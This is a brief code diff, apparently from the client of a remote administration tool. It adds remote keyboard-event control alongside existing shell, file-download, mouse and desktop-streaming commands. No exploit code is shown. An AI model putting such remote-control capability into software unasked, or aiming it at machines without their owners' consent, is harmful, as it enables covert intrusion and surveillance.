@@ -37,7 +37,6 @@ namespace xClient
 
         private static void Cleanup()
         {
-            CommandHandler.IsStreamingDesktop = false;
             CommandHandler.CloseShell();
             if (CommandHandler.StreamCodec != null)
                 CommandHandler.StreamCodec.Dispose();
@@ -69,6 +68,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.GetDirectory),
                 typeof (Core.Packets.ServerPackets.DoDownloadFile),
                 typeof (Core.Packets.ServerPackets.DoMouseEvent),
+                typeof (Core.Packets.ServerPackets.DoKeyboardEvent),
                 typeof (Core.Packets.ServerPackets.GetSystemInfo),
                 typeof (Core.Packets.ServerPackets.DoVisitWebsite),
                 typeof (Core.Packets.ServerPackets.DoShowMessageBox),
